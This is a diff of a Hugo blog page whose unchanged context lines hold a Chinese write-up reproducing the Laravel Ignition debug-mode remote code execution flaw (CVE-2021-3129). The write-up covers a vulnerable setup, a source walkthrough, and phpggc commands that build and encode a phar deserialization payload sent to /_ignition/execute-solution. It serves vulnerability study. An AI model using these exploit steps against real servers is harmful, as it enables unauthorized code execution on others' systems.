@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>[CVE-2021-3129]Laravel Debug mode RCE复现 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -295,7 +295,7 @@
 <h2 id="环境搭建"><a href="#环境搭建" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:环境搭建" class="headings">环境搭建</a></h2>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -303,7 +303,7 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">composer create-project --prefer-dist laravel/laravel laraveldemo 8.4.2
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">composer create-project --prefer-dist laravel/laravel laraveldemo 8.4.2
 <span class="nb">cd</span> laraveldemo
 composer install <span class="c1"># 运行报错的看下面和我遇到的问题是不是一样的</span>
 composer require facade/ignition<span class="o">==</span>2.5.1 <span class="c1"># 下载有漏洞的组件</span>
@@ -326,7 +326,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 <p><code>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php/ExecuteSolutionController</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -343,7 +343,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">ExecuteSolutionController</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">ExecuteSolutionController</span>
 <span class="p">{</span>
     <span class="k">use</span> <span class="nx">ValidatesRequests</span><span class="p">;</span>
 
@@ -364,7 +364,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 <p>参数规则</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -373,7 +373,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">rules</span><span class="p">()</span><span class="o">:</span> <span class="k">array</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">rules</span><span class="p">()</span><span class="o">:</span> <span class="k">array</span>
 <span class="p">{</span>
     <span class="k">return</span> <span class="p">[</span>
         <span class="s1">&#39;solution&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;required&#39;</span><span class="p">,</span>
@@ -387,7 +387,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 <p><code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution/MakeViewVariableOptionalSolution::getRunParameters</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -396,7 +396,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">getRunParameters</span><span class="p">()</span><span class="o">:</span> <span class="k">array</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">getRunParameters</span><span class="p">()</span><span class="o">:</span> <span class="k">array</span>
 <span class="p">{</span>
     <span class="k">return</span> <span class="p">[</span>
         <span class="s1">&#39;variableName&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">variableName</span><span class="p">,</span>
@@ -410,7 +410,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </code></pre><p>直接进入run函数</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -419,7 +419,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
 <span class="p">{</span>
     <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">makeOptional</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$output</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
@@ -431,7 +431,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </div><p>然后进入makeOptional函数</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -449,7 +449,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">makeOptional</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">makeOptional</span><span class="p">(</span><span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
 <span class="p">{</span>
     <span class="nv">$originalContents</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;viewFile&#39;</span><span class="p">]);</span>
     <span class="nv">$newContents</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">],</span> <span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$parameters</span><span class="p">[</span><span class="s1">&#39;variableName&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34; ?? &#39;&#39;&#34;</span><span class="p">,</span> <span class="nv">$originalContents</span><span class="p">);</span>
@@ -473,7 +473,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 <p>看一下generateExpectedTokens方法</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -490,7 +490,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">generateExpectedTokens</span><span class="p">(</span><span class="k">array</span> <span class="nv">$originalTokens</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$variableName</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">generateExpectedTokens</span><span class="p">(</span><span class="k">array</span> <span class="nv">$originalTokens</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$variableName</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span>
 <span class="p">{</span>
     <span class="nv">$expectedTokens</span> <span class="o">=</span> <span class="p">[];</span>
     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$originalTokens</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span> <span class="p">{</span>
@@ -511,7 +511,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 <p>本地尝试了两种方法的比较后明白了区别，由于token_get_all解析结果与是否满足php结构有关，所以文件内容是否满足php结构就非常重要，通过下面代码可知这样的过滤方法只适用于非php的且有<code>$</code>符号的文件（太菜了，想不出应用</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -540,7 +540,7 @@ php artisan serve --host<span class="o">=</span>0.0.0.0 <span class="c1"># 启�
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">function</span> <span class="nf">generateExpectedTokens</span><span class="p">(</span><span class="k">array</span> <span class="nv">$originalTokens</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$variableName</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span>
 <span class="p">{</span>
     <span class="nv">$expectedTokens</span> <span class="o">=</span> <span class="p">[];</span>
@@ -598,10 +598,10 @@ Content-Length: 177
 <p>从phpggc拿一条可用的链子生成phar图片</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">php -d<span class="s1">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o /var/www/html/tyskill.gif
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">php -d<span class="s1">&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o /var/www/html/tyskill.gif
 </code></pre></td></tr></table></div>
 </div>
 </div><p>然后POST向<code>/_ignition/execute-solution</code>传</p>
@@ -623,10 +623,10 @@ Content-Length: 177
 <p>由于log文件格式原因，我们需要在payload后面添加一个字符，使payload在从utf-16转成utf-8时总有一个payload能被转出来。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">php -d <span class="s2">&#34;phar.readonly=0&#34;</span> ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output <span class="p">|</span> base64 -w <span class="m">0</span> <span class="p">|</span> python3 -c <span class="s2">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">php -d <span class="s2">&#34;phar.readonly=0&#34;</span> ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output <span class="p">|</span> base64 -w <span class="m">0</span> <span class="p">|</span> python3 -c <span class="s2">&#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>3、发送AA用于对齐</p>
